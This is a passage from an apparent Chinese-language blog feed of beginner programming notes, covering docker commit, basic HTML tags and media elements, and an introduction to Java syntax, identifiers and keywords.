<h1 id="commit镜像"><a href="#commit镜像" class="headerlink" title="commit镜像"></a>commit镜像</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker commit 提交容器成为一个新的副本</span><br><span class="line"></span><br><span class="line">#命今和git原理类似</span><br><span class="line">docker commit -m=&quot;提交的描述信息”-a=&quot;作者”容器id 目标镜像名:[TAG]</span><br><span class="line"></span><br><span class="line">实战测试</span><br><span class="line"># 1、启动一个默认的tomcat</span><br><span class="line"># 2、发现这个默认的tomcat 是没有webapps应用，镜像的原因，官方的镜像默认 webapps下面是没有文件的!</span><br><span class="line"># 3、我自己拷贝进去了基本的文件</span><br><span class="line"># 4、将我们操作过的容器通过commit提交为一个境像! 我们以后就使用我们修改过的镜像即可，这就是我们自己的一个修改的镜像</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>HTML</title>
    <url>/2023/08/08/HTML/</url>
    <content><![CDATA[<h1 id="html基本元素标签"><a href="#html基本元素标签" class="headerlink" title="html基本元素标签"></a>html基本元素标签</h1><span id="more"></span>

<ol>
<li><p><code>&lt;html&gt;</code>：HTML网页的根标签，表示一个HTML文档的开始和结束</p>
</li>
<li><p><code>&lt;head&gt;</code>：HTML文档的头部，用于描述文档的元数据、样式等信息</p>
</li>
<li><p><code>&lt;title&gt;</code>：HTML文档的标题标签，用于在浏览器标签栏中显示文档的标题</p>
</li>
<li><p><code>&lt;body&gt;</code>：HTML文档的主体部分，包含了网页的实际内容</p>
</li>
<li><p><code>&lt;h1&gt;</code>～<code>&lt;h6&gt;</code>：标题标签，表示文本的标题，从大到小分别对应不同级别的标题</p>
</li>
<li><p><code>&lt;p&gt;</code>：段落标签，用于分隔文本内容</p>
</li>
<li><p><code>&lt;a&gt;</code>：超链接标签，用于添加链接到其他文档、页面、图片等</p>
</li>
<li><p><code>&lt;img&gt;</code>：图片标签，用于在网页中嵌入图片</p>
</li>
<li><p><code>&lt;ul&gt;</code>：无序列表标签，用于创建无序列表</p>
</li>
<li><p><code>&lt;ol&gt;</code>：有序列表标签，用于创建有序列表</p>
</li>
<li><p><code>&lt;li&gt;</code>：列表项标签，用于创建列表项</p>
</li>
<li><p><code>&lt;table&gt;</code>：表格标签，用于创建表格</p>
</li>
<li><p><code>&lt;tr&gt;</code>：表格的行标签，表示一行</p>
</li>
<li><p><code>&lt;td&gt;</code>：单元格标签，用于表示表格中的单元格</p>
</li>
<li><p><code>&lt;form&gt;</code>：表单标签，用于创建表单</p>
</li>
<li><p><code>&lt;input&gt;</code>：输入框标签，用于输入文本、表单等</p>
</li>
<li><p><code>&lt;select&gt;</code>：下拉列表标签，用于创建下拉选择框</p>
</li>
<li><p><code>&lt;textarea&gt;</code>：文本域标签，允许用户输入多行文本</p>
</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文档声明，声明当前网页的版本--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--html的根标签（元素），网页中的所有内容都要写在根元素的里边--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--head是网页头部，head中的内容不会在网页中直接出现，主要用来帮助浏览器或搜索引擎来解析网页--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--meta标签用来设置网页的元数据，这里meta用来设置网页的字符集，避免乱码问题--&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--UTF-8（万国码）--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>显示在浏览器的标题栏<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--body是html的子元素，表示网页的主体，网页中的所有可见的内容都应写在body里面--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      这里是主体</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="格式化标签"><a href="#格式化标签" class="headerlink" title="格式化标签"></a>格式化标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;br/&gt;         换行</span><br><span class="line"></span><br><span class="line">&lt;center&gt; &lt;/center&gt; 居中</span><br><span class="line"></span><br><span class="line">&lt;span&gt;&lt;/span&gt; 行标签(没有换行) </span><br><span class="line">&lt;kbd&gt;&lt;/kbd&gt;   定义键盘码    </span><br><span class="line"></span><br><span class="line">&lt;p&gt;&lt;/p&gt;       行标签(自带换行)</span><br><span class="line">&lt;pre&gt;&lt;/pre&gt;   块标签不解析内容</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;/code&gt; 行标签不解析内容   </span><br><span class="line">&lt;var&gt;&lt;/var&gt;   定义变量</span><br><span class="line">&lt;em&gt;帅&lt;/em&gt;</span><br><span class="line">&lt;strong&gt;帅&lt;/strong&gt;</span><br><span class="line">em和strong标签都表示强调，但是它们还是有一定的差别的</span><br><span class="line">第一em标签的样式是斜体，而strong标签的样式是加粗</span><br><span class="line">第二em标签是强调语义的，而strong标签是强调内容的</span><br><span class="line">em标签和strong标签都是行内元素。</span><br></pre></td></tr></table></figure>
<h3 id="样式标签"><a href="#样式标签" class="headerlink" title="样式标签"></a>样式标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;b&gt;加粗&lt;/b&gt;</span><br><span class="line">&lt;i&gt;倾斜&lt;/i&gt;</span><br><span class="line">&lt;s&gt;删除线&lt;/s&gt; 或 &lt;del&gt;19999&lt;/del&gt;</span><br><span class="line">&lt;u&gt;下划线&lt;/u&gt;</span><br><span class="line">&lt;font size=2&gt;字体大小&lt;/font&gt;</span><br><span class="line">&lt;font color=&quot;#fa8072&quot;&gt;字体颜色&lt;/font&gt;  </span><br><span class="line">&lt;hr&gt; 水平线 </span><br><span class="line">&lt;blockquote&gt;孔子说的不对&lt;/blockquote&gt;</span><br><span class="line">&lt;q&gt;老子才不对&lt;/q&gt;&lt;br&gt;</span><br><span class="line">q标签和blockquote标签都是引用，不同的是q标签是短引，用而blockquote标签是长引用会换行的。</span><br></pre></td></tr></table></figure>
<h3 id="转义字符"><a href="#转义字符" class="headerlink" title="转义字符"></a>转义字符</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;      &amp;lt; </span><br><span class="line">&gt;      &amp;gt; </span><br><span class="line">空格   &amp;nbsp; </span><br><span class="line">©     &amp;copy; </span><br><span class="line">®     &amp;reg; </span><br><span class="line">™     &amp;trade;</span><br></pre></td></tr></table></figure>

<h3 id="列表标签和表格标签"><a href="#列表标签和表格标签" class="headerlink" title="列表标签和表格标签"></a>列表标签和表格标签</h3><p>列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无序列表</span><br><span class="line">&lt;ul&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">有序列表</span><br><span class="line">&lt;ol&gt;</span><br><span class="line">    &lt;li&gt;a&lt;/li&gt;</span><br><span class="line">    &lt;li&gt;b&lt;/li&gt;</span><br><span class="line">&lt;/ol&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">自定义列表 没有圆点和需要</span><br><span class="line">&lt;dl&gt;</span><br><span class="line">    &lt;dt&gt;标题&lt;/dt&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;</span><br><span class="line">    &lt;dd&gt;内容&lt;/dd&gt;..</span><br><span class="line">&lt;/dl&gt;</span><br></pre></td></tr></table></figure>

<p>表格</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">cellspacing属性是单元格之间的空隙</span><br><span class="line">cellpadding属性是控制整个单元格的大小</span><br><span class="line">border  是边框粗细</span><br><span class="line">align=&quot;center&quot; 居中   left左  right右</span><br><span class="line">style=&quot;text-align: center&quot; 字体居中</span><br><span class="line">其他的就需要使用css来控制了</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;table   cellspacing=&quot;0&quot; style=&quot;text-align: center&quot;  border=&quot;1px&quot;   &gt;</span><br><span class="line">    &lt;tr &gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题2&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;td &gt;1&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;1&lt;/td&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br></pre></td></tr></table></figure>

<h3 id="常用的布局标签"><a href="#常用的布局标签" class="headerlink" title="常用的布局标签"></a>常用的布局标签</h3><p>header   网页的头部</p>
<p>main     网页的主体部分（一般只有一个）</p>
<p>footer   网页的底部</p>
<p>nav      网页的导航</p>
<p>aside    和主题相关的内容</p>
<p>article  文章之类的</p>
<p>section  独立的块区，上面的标签都不合适，就用这个</p>
<p>div      块元素</p>
<h3 id="常用的图片标签"><a href="#常用的图片标签" class="headerlink" title="常用的图片标签"></a>常用的图片标签</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;img src=&quot;图片地址&quot; alt=&quot;图片不显示时候的提示语句&quot; title=&quot;鼠标悬停提示文字&quot; </span><br><span class="line">width=&quot;图片宽px&quot; height=&quot;图片高px&quot;/&gt;</span><br><span class="line">如果宽高不写就默认原图片大小</span><br><span class="line"></span><br><span class="line">img 的其他属性:   </span><br><span class="line"></span><br><span class="line">hspace 和 vspace 属性可以设置图像周围的空间。   类似于设置外边距效果</span><br><span class="line">hspace:左边和右边的文字与图像之间的间距  单位像素(px)</span><br><span class="line">vspace:上面的下面的文字与图像之间的距离  单位像素(px)</span><br><span class="line"></span><br><span class="line">align 属性定义了图像相对于周围元素的水平和垂直对齐方式。</span><br><span class="line">align的值:left(左)、right(右)、top(上) 、middle(中) 和 bottom(下)。</span><br><span class="line">left 和 right 值会把图像周围与其相连的文本转移到相应的边界中；</span><br><span class="line">其余的三个值将图像与其相邻的文字在垂直方向上对齐</span><br></pre></td></tr></table></figure>

<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls提供播放暂停音量控制  必须有</span><br><span class="line">autoplay 自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">preload  视频在页面加载时进行加载，并预备播放。</span><br><span class="line">	如果使用 &quot;autoplay&quot;，则忽略属性。属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">    </span><br><span class="line">(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">loop   媒介文件完成播放后再次开始播放     重复播放</span><br><span class="line">width=”宽度”  height=”高度”</span><br><span class="line">muted   视频的音频应该被静音</span><br><span class="line"></span><br><span class="line">&lt;video width=&quot;320&quot; height=&quot;240&quot; controls &gt;</span><br><span class="line">    &lt;source src=&quot;img/1.mp4&quot; type=&quot;video/mp4&quot;&gt;</span><br><span class="line">    您的浏览器不支持 video 属性。</span><br><span class="line">&lt;/video&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  视频类型</span><br></pre></td></tr></table></figure>

<h3 id="音频"><a href="#音频" class="headerlink" title="音频"></a>音频</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">controls   向用户显示控件，比如播放按钮。</span><br><span class="line">autoplay   自动播放。 (一般不要设置 会增加页面的加载速度) 有的游览器会拦截</span><br><span class="line">loop     每当音频结束时重新开始播放   </span><br><span class="line">preload  音频在页面加载时进行加载，并预备播放。如果使用 &quot;autoplay&quot;，则忽略该属性。  属性值</span><br><span class="line">	auto - 当页面加载后载入整个音频</span><br><span class="line">	meta - 当页面加载后只载入元数据</span><br><span class="line">	none - 当页面加载后不载入音频</span><br><span class="line">	(一般不要设置 会增加页面的加载速度)</span><br><span class="line"></span><br><span class="line">&lt;audio controls  autoplay loop&gt;</span><br><span class="line">    &lt;source src=&quot;img/无羁.mp3&quot; type=&quot;audio/mp3&quot; &gt;</span><br><span class="line">    游览器不支持此播放器</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br><span class="line">游览器的不同 显示的 视频 播放按钮的样式也是不同的</span><br><span class="line">source支持写多个    游览器 从上到下 识别最适合他的  音频类型</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Java简介</title>
    <url>/2023/07/26/Java1/</url>
    <content><![CDATA[<h2 id="什么是Java"><a href="#什么是Java" class="headerlink" title="什么是Java"></a>什么是Java</h2><span id="more"></span>

<p>Java是一门面向对象编程语言，不仅吸收了C++语言的各种优点，还摒弃了C++里难以理解的多继承、指针等概念，因此Java语言具有功能强大和简单易用两个特征。Java语言作为静态面向对象编程语言的代表，极好地实现了面向对象理论，允许程序员以优雅的思维方式进行复杂的编程 。</p>
<h2 id="诞生背景"><a href="#诞生背景" class="headerlink" title="诞生背景"></a>诞生背景</h2><p>任职于Sun公司(Stanford University Network斯坦福网络公司)的詹姆斯·高斯林和麦克·舍林丹等人于1990年代初开发Java语言的雏形，最初被命名为Oak，Oak的目标是作为家用电器等小型系统的编程语言，用于电视机、电话、闹钟、烤面包机等家用电器的控制和通信。由于这些智能化家电的市场需求没有预期的高，Sun公司放弃了该项计划。随着1990年代互联网的发展，Sun公司发现Oak在互联网上应用的前景，于是改造了Oak，于1995年5月以Java的名称正式发布。伴随着互联网的迅猛发展，Java逐渐成为重要的网络编程语言。</p>
<h2 id="语言特点与应用场景"><a href="#语言特点与应用场景" class="headerlink" title="语言特点与应用场景"></a>语言特点与应用场景</h2><p>Java语言具有简单性、面向对象、分布式、健壮性、安全性、跨平台性、可移植性、多线程与动态性等特点。Java语言可以编写桌面应用程序、Web应用程序、分布式系统和嵌入式系统等 。Java 快速、安全、可靠。从笔记本电脑到数据中心，从游戏控制台到超级计算机，从手机到互联网，Java 无处不在！</p>
<h2 id="JVM、JRE和JDK的关系"><a href="#JVM、JRE和JDK的关系" class="headerlink" title="JVM、JRE和JDK的关系"></a>JVM、JRE和JDK的关系</h2><h4 id="JVM"><a href="#JVM" class="headerlink" title="JVM"></a>JVM</h4><p>Java Virtual Machine是Java虚拟机，Java程序需要运行在虚拟机上，不同的平台有自己的虚拟机，因此Java语言可以实现跨平台。</p>
<h4 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h4><p>Java Runtime Environment包括Java虚拟机和Java程序所需的核心类库等。核心类库主要是java.lang包：包含了运行Java程序必不可少的系统类，如基本数据类型、基本数学函数、字符串处理、线程、异常处理类等，系统缺省加载这个包</p>
<p>如果想要运行一个开发好的Java程序，计算机中只需要安装JRE即可。</p>
<h4 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h4><p>Java Development Kit是提供给Java开发人员使用的，其中包含了Java的开发工具，也包括了JRE。所以安装了JDK，就无需再单独安装JRE了。其中的开发工具：编译工具(javac.exe)，打包工具(jar.exe)等</p>
<p>JVM&amp;JRE&amp;JDK关系图</p>
<p><img src="https://img-blog.csdnimg.cn/20210430091557268.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lhbmcxMzU2Mzc1ODEyOA==,size_16,color_FFFFFF,t_70" alt="img"></p>
<h1 id="Java是编译型还是解释型语言"><a href="#Java是编译型还是解释型语言" class="headerlink" title="Java是编译型还是解释型语言"></a>Java是编译型还是解释型语言</h1><h3 id="1-编译型语言和解释型语言"><a href="#1-编译型语言和解释型语言" class="headerlink" title="1.编译型语言和解释型语言"></a>1.编译型语言和解释型语言</h3><h5 id="编译型语言"><a href="#编译型语言" class="headerlink" title="编译型语言"></a>编译型语言</h5><p><strong>定义</strong>：在程序运行之前，通过编译器将源程序编译成机器码(可运行的二进制代码)，以后执行这个程序时，就不用再进行编译了。</p>
<p><strong>优点</strong>：编译器一般会有预编译的过程对代码进行优化。因为编译只做一次，运行时不需要编译，所以编译型语言的程序执行效率高，可以脱离语言环境独立运行。</p>
<p><strong>缺点</strong>：编译之后如果需要修改就需要整个模块重新编译。编译的时候根据对应的运行环境生成机器码，不同的操作系统之间移植就会有问题，需要根据运行的操作系统环境编译不同的可执行文件。</p>
<p><strong>总结</strong>：执行速度快、效率高；依靠编译器、跨平台性差些。</p>
<p><strong>代表语言</strong>：C、C++、Pascal、Object-C以及Swift。</p>
<h6 id="解释型语言"><a href="#解释型语言" class="headerlink" title="解释型语言"></a>解释型语言</h6><p><strong>定义</strong>：解释型语言的源代码不是直接翻译成机器码，而是先翻译成中间代码，再由解释器对中间代码进行解释运行。在运行的时候才将源程序翻译成机器码，翻译一句，然后执行一句，直至结束。</p>
<p>优点：有良好的平台兼容性，在任何环境中都可以运行，前提是安装了解释器（虚拟机）。灵活，修改代码的时候直接修改就可以，可以快速部署，不用停机维护。</p>
<p><strong>缺点</strong>：每次运行的时候都要解释一遍，性能上不如编译型语言。</p>
<p><strong>总结</strong>：执行速度慢、效率低；依靠解释器、跨平台性好。</p>
<p><strong>代表语言</strong>：JavaScript、Python、Erlang、PHP、Perl、Ruby。</p>
<h5 id="混合型语言"><a href="#混合型语言" class="headerlink" title="混合型语言"></a>混合型语言</h5><p><strong>定义</strong>：既然编译型和解释型各有缺点就会有人想到把两种类型整合起来，取其精华去其糟粕，就出现了半编译，半解释型语言。</p>
<p>比如C#，C#在编译的时候不是直接编译成机器码而是中间码，.NET平台提供了中间语言运行库运行中间码，中间语言运行库类似于Java虚拟机。.NET在编译成IL代码后，保存在dll中，首次运行时由JIT在编译成机器码缓存在内存中，下次直接执行。严格来说混合型语言属于解释型语言，C#更接近编译型语言。</p>
<p><strong>Java即是编译型的，也是解释型语言，总的来说Java更接近解释型语言。</strong></p>
<p>可以说它是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就什么用都没有。同时围绕JVM的效率问题，会涉及一些如JIT、AOT等优化技术，例如JIT技术，会将热点代码编译成机器码。而AOT技术，是在运行前，通过工具直接将字节码转换为机器码。</p>
<p>可以说它是解释型的。因为Java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释运行的。</p>
<h3 id="2-动态类型语言和静态类型语言"><a href="#2-动态类型语言和静态类型语言" class="headerlink" title="2.动态类型语言和静态类型语言"></a>2.动态类型语言和静态类型语言</h3><h6 id="动态类型语言"><a href="#动态类型语言" class="headerlink" title="动态类型语言"></a>动态类型语言</h6><p>动态类型语言：在运行期间才去做数据类型检查的语言，说的是数据类型。动态类型语言的数据类型不是在编译阶段决定的，而是把类型绑定延后到了运行阶段。</p>
<p>代表语言：Python、Ruby、Erlang、JavaScript、Swift、PHP、Perl。</p>
<h6 id="静态类型语言"><a href="#静态类型语言" class="headerlink" title="静态类型语言"></a>静态类型语言</h6><p>静态类型语言的数据类型是在编译期间（或运行之前）确定的，编写代码的时候要明确确定变量的数据类型。</p>
<p>代表语言：C、C++、C#、Java、Object-C。</p>
<h3 id="3-动态语言和静态语言"><a href="#3-动态语言和静态语言" class="headerlink" title="3.动态语言和静态语言"></a>3.动态语言和静态语言</h3><h5 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h5><p>动态类型语言和动态语言是完全不同的两个概念。</p>
<p>动态语言：说的是运行时改变结构，说的是代码结构。在运行时可以改变其结构的语言：例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。通俗点说就是在运行时代码可以根据某些条件改变自身结构。</p>
<p>代表语言：Object-C、C#、JavaScript、PHP、Python、Erlang。</p>
<h5 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h5><p>与动态语言相对应的，运行时结构不可变的语言就是静态语言。如Java、C、C++。</p>
]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础知识</title>
    <url>/2023/07/26/Java2/</url>
    <content><![CDATA[<h1 id="Java-基础语法"><a href="#Java-基础语法" class="headerlink" title="Java 基础语法"></a>Java 基础语法</h1><span id="more"></span>

<p>一个 Java 程序可以认为是一系列对象的集合，而这些对象通过调用彼此的方法来协同工作。下面简要介绍下类、对象、方法和实例变量的概念。</p>
<ul>
<li><strong>对象</strong>：对象是类的一个实例，有状态和行为。例如，一条狗是一个对象，它的状态有：颜色、名字、品种；行为有：摇尾巴、叫、吃等。</li>
<li><strong>类</strong>：类是一个模板，它描述一类对象的行为和状态。</li>
<li><strong>方法</strong>：方法就是行为，一个类可以有很多方法。逻辑运算、数据修改以及所有动作都是在方法中完成的。</li>
<li><strong>实例变量</strong>：每个对象都有独特的实例变量，对象的状态由这些实例变量的值决定。</li>
</ul>
<hr>
<h2 id="第一个Java程序"><a href="#第一个Java程序" class="headerlink" title="第一个Java程序"></a>第一个Java程序</h2><p>下面看一个简单的 Java 程序，它将输出字符串 <em>Hello World</em></p>
<h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>Java程序中最基本的组成单位是类<br>类的定义格式：public c1ass类名{}</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">public</span> <span class="string">class</span> <span class="string">HelloWorld</span> &#123;   </span><br><span class="line"><span class="string">//这里是main方法</span></span><br><span class="line"><span class="string">//main方法是程序的入口方法，代码的执行是从main方法开始的</span></span><br><span class="line">  	<span class="string">public</span> <span class="string">static</span> <span class="string">void</span> <span class="string">main(String</span>[] <span class="string">args)</span> &#123;      </span><br><span class="line">        <span class="string">System.out.println(&quot;Hello</span> <span class="string">World&quot;);</span> <span class="string">//</span> <span class="string">输出</span> <span class="string">Hello</span> <span class="string">World</span></span><br><span class="line">	&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>如何保存、编译以及运行这个程序：</p>
<ul>
<li>打开代码编辑器，把上面的代码添加进去；</li>
<li>把文件名保存为：HelloWorld.java；</li>
<li>打开 cmd 命令窗口，进入目标文件所在的位置，假设是 C:\</li>
<li>在命令行窗口输入 <strong>javac HelloWorld.java</strong> 按下回车键编译代码。如果代码没有错误，cmd 命令提示符会进入下一行（假设环境变量都设置好了）。</li>
<li>再键输入 <strong>java HelloWorld</strong> 按下回车键就可以运行程序了</li>
</ul>
<p>你将会在窗口看到 Hello World</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ javac HelloWorld.java</span><br><span class="line">$ java HelloWorld </span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure>

<p>如果遇到编码问题，我们可以使用 <strong>-encoding</strong> 选项设置 <strong>utf-8</strong> 来编译：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -encoding UTF-8 HelloWorld.java </span><br><span class="line">java HelloWorld </span><br></pre></td></tr></table></figure>

<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>编写 Java 程序时，应注意以下几点：</p>
<ul>
<li><strong>大小写敏感</strong>：Java 是大小写敏感的，这就意味着标识符 Hello 与 hello 是不同的。</li>
<li><strong>类名</strong>：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 <strong>MyFirstJavaClass</strong> 。</li>
<li><strong>方法名</strong>：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。</li>
<li><strong>源文件名</strong>：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记 Java 是大小写敏感的），文件名的后缀为 <strong>.java</strong>。（如果文件名和类名不相同则会导致编译错误）。</li>
<li><strong>主方法入口</strong>：所有的 Java 程序由 <strong>public static void main(String[] args)</strong> 方法开始执行。</li>
</ul>
<h2 id="Java-标识符"><a href="#Java-标识符" class="headerlink" title="Java 标识符"></a>Java 标识符</h2><p>Java 所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。</p>
<p>关于 Java 标识符，有以下几点需要注意：</p>
<ul>
<li><p>所有的标识符都应该以字母（A-Z 或者 a-z）,美元符（$）、或者下划线（_）开始</p>
</li>
<li><p>首字符之后可以是字母（A-Z 或者 a-z）,美元符（$）、下划线（_）或数字的任何字符组合</p>
</li>
<li><p>关键字不能用作标识符</p>
</li>
<li><p>标识符是大小写敏感的</p>
</li>
<li><p>合法标识符举例：age、$salary、_value、__1_value</p>
</li>
<li><p>非法标识符举例：123abc、-salary</p>
</li>
</ul>
<h2 id="常见命名约定"><a href="#常见命名约定" class="headerlink" title="常见命名约定"></a>常见命名约定</h2><p><strong>小驼峰命名法:方法、变量</strong><br>约定1:标识符是一个单词的时候，首字母小写<br>范例1:name<br>约定2:标识符由多个单词组成的时候，第一个单词首字母小写，其他单词首字母大写<br>范例2:firstName<br><strong>大驼峰命名法:类</strong><br>约定1:标识符是一个单词的时候，首字母大写<br>范例1:Student<br>约定2:标识符由多个单词组成的时候，每个单词的首字母大写<br>范例2:GoodStudent</p>
<h2 id="Java-变量"><a href="#Java-变量" class="headerlink" title="Java 变量"></a>Java 变量</h2><p>Java 中主要有如下几种类型的变量</p>
<ul>
<li>局部变量</li>
<li>类变量（静态变量）</li>
<li>成员变量（非静态变量）</li>
</ul>
<h2 id="Java-关键字"><a href="#Java-关键字" class="headerlink" title="Java 关键字"></a>Java 关键字</h2><p>下面列出了 Java 关键字。这些保留字不能用于常量、变量、和任何标识符的名称。</p>
<table>
<thead>
<tr>
<th align="left">类别</th>
<th align="left">关键字</th>
<th align="left">说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left">访问控制</td>
<td align="left">private</td>
<td align="left">私有的</td>
</tr>
<tr>
<td align="left">protected</td>
<td align="left">受保护的</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">public</td>
<td align="left">公共的</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">default</td>
<td align="left">默认</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">类、方法和变量修饰符</td>
<td align="left">abstract</td>
<td align="left">声明抽象</td>
</tr>
<tr>
<td align="left">class</td>
<td align="left">类</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">extends</td>
<td align="left">扩充、继承</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">final</td>
<td align="left">最终值、不可改变的</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">implements</td>
<td align="left">实现（接口）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">interface</td>
<td align="left">接口</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">native</td>
<td align="left">本地、原生方法（非 Java 实现）</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">new</td>
<td align="left">创建</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">static</td>
<td align="left">静态</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">strictfp</td>
<td align="left">严格浮点、精准浮点</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">synchronized</td>
<td align="left">线程、同步</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">transient</td>
<td align="left">短暂</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">volatile</td>
<td align="left">易失</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">程序控制语句</td>
<td align="left">break</td>
<td align="left">跳出循环</td>
</tr>
<tr>
<td align="left">case</td>
<td align="left">定义一个值以供 switch 选择</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">continue</td>
<td align="left">继续</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">do</td>
<td align="left">运行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">else</td>
<td align="left">否则</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">for</td>
<td align="left">循环</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">if</td>
<td align="left">如果</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">instanceof</td>
<td align="left">实例</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">return</td>
<td align="left">返回</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">switch</td>
<td align="left">根据值选择执行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">while</td>
<td align="left">循环</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">错误处理</td>
<td align="left">assert</td>
<td align="left">断言表达式是否为真</td>
</tr>
<tr>
<td align="left">catch</td>
<td align="left">捕捉异常</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">finally</td>
<td align="left">有没有异常都执行</td>
<td align="left"></td>
</tr>
<tr>
<td align="left">throw</td>
<td align="left">抛出一个异常对象</td>
<td align="left"></td>
</tr>
